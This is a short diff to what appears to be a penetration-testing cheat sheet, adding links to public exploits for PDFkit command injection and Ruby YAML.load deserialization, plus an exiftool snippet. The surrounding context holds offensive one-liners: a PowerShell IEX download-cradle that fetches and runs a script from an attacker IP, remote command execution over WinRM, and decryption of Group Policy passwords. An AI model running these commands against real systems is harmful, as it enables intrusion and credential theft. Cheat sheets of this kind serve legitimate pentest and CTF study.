@@ -86,6 +86,7 @@ nmap -n -Pn -p80 -sV --script=http-default-account 'IP'
   - [CVE-2017-7269](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/) - Windows Server 2003 R2 IIS6.0 webdav
   - [CVE-2018-9276](https://github.com/A1vinSmith/CVE-2018-9276) - PRTG Network Monito
   - [CVE-2019-25065](https://www.exploit-db.com/exploits/47691) - OpenNetAdmin
+  - [CVE-2022-25765](https://github.com/nikn0laty/PDFkit-CMD-Injection-CVE-2022-25765)- PDFkit
 
 
 ## 88
@@ -715,10 +716,14 @@ netexec winrm 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -X 'POWERSHELLCOMMAND'
 ```sh
 2to3-2.7 --no-diffs -w 'FILENAME'
 ```
+- exiftool
+```sh
+exiftool 'FILENAME'
+```
 - gpp-decrypt
 ```sh
 # MS14-025
- gpp-decrypt "Groups.xmlのcpassword"
+gpp-decrypt "Groups.xmlのcpassword"
 ```
 - hashcat
 ```sh
@@ -797,6 +802,7 @@ IEX(new-object net.webclient).downloadstring('http://IP/.ps1')
 - https://kakyouim.hatenablog.com/entry/2020/05/27/010807
 #### other
 - [CVE-2023-32784](https://github.com/z-jxy/keepass_dump)
+- [PoC](https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml) - Ruby / YAML.load()
 
 
 ## link
